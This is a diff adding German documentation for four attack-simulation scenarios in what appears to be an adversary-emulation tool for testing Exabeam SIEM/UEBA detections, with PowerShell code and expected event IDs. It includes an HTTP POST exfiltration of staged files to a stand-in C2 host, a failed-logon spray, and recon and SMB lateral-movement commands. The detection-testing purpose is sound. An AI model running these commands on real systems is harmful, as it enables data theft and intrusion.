@@ -2178,6 +2178,156 @@ tasklist /v             # Laufende Prozesse
 
 ---
 
+#### UEBA-DATA-STAGING — Data Staging + Exfiltration Chain
+
+| Eigenschaft | Wert |
+|---|---|
+| UEBA Use Case | Data Exfiltration / Abnormal Data Movement (Exabeam Package: Data Exfiltration) |
+| Admin erforderlich | Nein |
+| Cleanup | Staging-Verzeichnis entfernt |
+
+**Was wird ausgeführt:**
+
+```powershell
+# Step 1: Synthetische Dateien in Staging-Verzeichnis erstellen
+$stageDir = "$env:TEMP\lnj_stage"
+New-Item -ItemType Directory -Path $stageDir -Force | Out-Null
+for ($i = 1; $i -le 5; $i++) {
+    Set-Content -Path "$stageDir\sensitive_doc_$i.txt" -Value "CONFIDENTIAL DATA FILE $i`n$("A" * 1000)"
+}
+
+# Step 2: Base64-Kodierung der gesammelten Dateiliste zur Exfiltration
+$stagedFiles = Get-ChildItem $stageDir | Select-Object Name, Length, LastWriteTime
+$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($stagedFiles | ForEach-Object { $_.Name }) -join "`n"))
+
+# Step 3: HTTP POST Exfiltration zu C2 (Sysmon EID 3 + EID 11)
+try {
+    Invoke-WebRequest -Uri "http://lognojutsu-c2.invalid/exfil" -Method POST -Body $encoded -TimeoutSec 3 -ErrorAction Stop | Out-Null
+} catch {
+    Write-Host "Exfil-Verbindung fehlgeschlagen (erwartet — kein echter C2-Verkehr)"
+}
+```
+
+**UEBA-Erkennungslogik:** Exabeam erkennt ungewoehnliche Datenmengen die in ein Staging-Verzeichnis kopiert und anschliessend ueber HTTP exfiltriert werden. Die Kombination aus Dateisammlung und ausgehender Verbindung in derselben Session erhoht den Risikowert.
+
+**Erwartete SIEM-Events:**
+- `4104` — ScriptBlock: Datei-Staging-Schleife kopiert Daten in TEMP-Verzeichnis
+- `Sysmon 11` — FileCreate: Staging-Dateien in Sammelverzeichnis erstellt
+- `Sysmon 3` — NetworkConnect: HTTP POST Exfiltrationsversuch zum C2-Host
+
+---
+
+#### UEBA-ACCOUNT-TAKEOVER — Account Takeover Chain
+
+| Eigenschaft | Wert |
+|---|---|
+| UEBA Use Case | Account Compromise / Credential Stuffing Chain (Exabeam Package: Compromised Credentials) |
+| Admin erforderlich | Nein |
+| Cleanup | Keiner |
+
+**Was wird ausgeführt:**
+
+```powershell
+# Step 1: 5 fehlgeschlagene Authentifizierungsversuche in schneller Folge (EID 4625)
+Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+for ($i = 1; $i -le 5; $i++) {
+    $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
+    $ctx.ValidateCredentials("takeover_test_user", "WrongPass$i!") | Out-Null
+    Start-Sleep -Milliseconds 200
+}
+
+# Step 2: Session-Kontext protokollieren (bestehende authentifizierte Session)
+Write-Host "Aktuelle Uhrzeit: $((Get-Date).ToString('yyyy-MM-dd HH:mm:ss'))"
+
+# Step 3: Post-Auth-Enumerationsburst — schnelle Recon nach Kontozugang (EID 4688)
+whoami /all; ipconfig /all; net user; net localgroup administrators
+```
+
+**UEBA-Erkennungslogik:** Exabeam korreliert fehlgeschlagene Anmeldeversuche (4625) mit anschliessender erfolgreicher Anmeldung und sofortiger Enumerationsaktivitaet. Der Uebergang von Spray zu Recon ist das Kernmuster fuer Account-Uebernahme.
+
+**Erwartete SIEM-Events:**
+- `4625` × 5 in schneller Folge — Brute-Force-Vorbote (Exabeam: Credential Stuffing)
+- `4624` — Anmelde-Event: bestehende Session (Exabeam: neue Session nach Fehlversuchen)
+- `4688` — Post-Auth-Enumerationsburst: `whoami`, `ipconfig`, `net user` in rascher Abfolge
+
+---
+
+#### UEBA-PRIV-ESC — Privilege Escalation Chain
+
+| Eigenschaft | Wert |
+|---|---|
+| UEBA Use Case | Abnormal Privilege Use (Exabeam Package: Privilege Escalation) |
+| Admin erforderlich | Nein |
+| Cleanup | Keiner |
+
+**Was wird ausgeführt:**
+
+```powershell
+# Step 1: Aktuelle Privileges aufzählen (EID 4688 — whoami /priv)
+whoami /priv
+
+# Step 2: Gruppenmitgliedschaften prüfen (EID 4688 — whoami /groups)
+whoami /groups
+
+# Step 3: Lokale Administratorengruppe aufzählen (EID 4688 — net localgroup)
+net localgroup administrators
+
+# Step 4: .NET API Privilege-Prüfung (EID 4104 — WindowsIdentity)
+$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
+$isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+Write-Host "Benutzer: $($identity.Name) | Administrator: $isAdmin"
+```
+
+**UEBA-Erkennungslogik:** Exabeam erkennt wenn ein normaler Benutzer Administratortools ausfuehrt (whoami /priv, net localgroup administrators) und Token-Pruefungen durchfuehrt. Die Haeufung von Privilege-Enumeration in kurzer Zeit triggert den Privilege-Escalation-Use-Case.
+
+**Erwartete SIEM-Events:**
+- `4688` — `whoami.exe /priv` — Privilege-Aufzählung (Exabeam: abnormale Admintools-Nutzung)
+- `4688` — `net.exe localgroup administrators` — Admin-Gruppenprüfung
+- `4104` — ScriptBlock: `WindowsIdentity` Privilege-Prüfung über .NET API
+- `4672` — Sonderrechte bei neuem Anmeldevorgang (wenn mit privilegiertem Konto ausgeführt)
+
+---
+
+#### UEBA-LATERAL-NEW-ASSET — Lateral Movement + New Asset Access
+
+| Eigenschaft | Wert |
+|---|---|
+| UEBA Use Case | First-Time Asset Access / Lateral Movement (Exabeam Package: Lateral Movement) |
+| Admin erforderlich | Nein |
+| Cleanup | SMB-Verbindung entfernt |
+
+**Was wird ausgeführt:**
+
+```powershell
+# Step 1: SMB Admin-Share-Zugriffsversuch (EID 5140 + Sysmon EID 3 auf Port 445)
+net use \\127.0.0.1\C$ 2>&1
+
+# Step 2: Freigaben auf Ziel-Host aufzählen (EID 4688 — net view)
+net view \\127.0.0.1 2>&1
+
+# Step 3: Aktive Sessions prüfen (EID 4688 — net session)
+net session 2>&1
+
+# Step 4: SMB-Port-Probe — Port 445 (Sysmon EID 3 — Netzwerkverbindung)
+$smb = Test-NetConnection -ComputerName 127.0.0.1 -Port 445 -InformationLevel Quiet -WarningAction SilentlyContinue
+Write-Host "SMB Port 445 erreichbar: $smb"
+
+# Step 5: RDP-Port-Probe — Port 3389 (Sysmon EID 3 — Lateral Movement via RDP)
+$rdp = Test-NetConnection -ComputerName 127.0.0.1 -Port 3389 -InformationLevel Quiet -WarningAction SilentlyContinue
+Write-Host "RDP Port 3389 erreichbar: $rdp"
+```
+
+**UEBA-Erkennungslogik:** Exabeam nutzt ein First-Time-Seen-Modell fuer Hostzugriffe. Wenn ein Benutzer erstmals auf einen internen Host per SMB (Port 445) oder RDP (Port 3389) zugreift wird dies als anomales Verhalten gewertet und erhoht den Session-Risikowert.
+
+**Erwartete SIEM-Events:**
+- `5140` — Netzwerk-Freigabeobjekt aufgerufen: SMB-Share-Zugriffsversuch (Exabeam: neuer Asset-Zugriff)
+- `4688` — `net.exe use/view` — Share-Aufzählung auf Ziel-Host
+- `Sysmon 3` — NetworkConnect: Port 445 SMB-Verbindungsversuch
+- `4624` — Anmelde-Event: Netzwerkanmeldung Typ 3 bei erfolgreichem Share-Zugriff
+
+---
+
 ## Kampagnen / Playbooks
 
 Kampagnen sind geordnete Abfolgen von Techniken, die reale Angreifer-TTPs nachbilden. Sie werden in der Web-UI im Tab "Playbooks" ausgewählt.
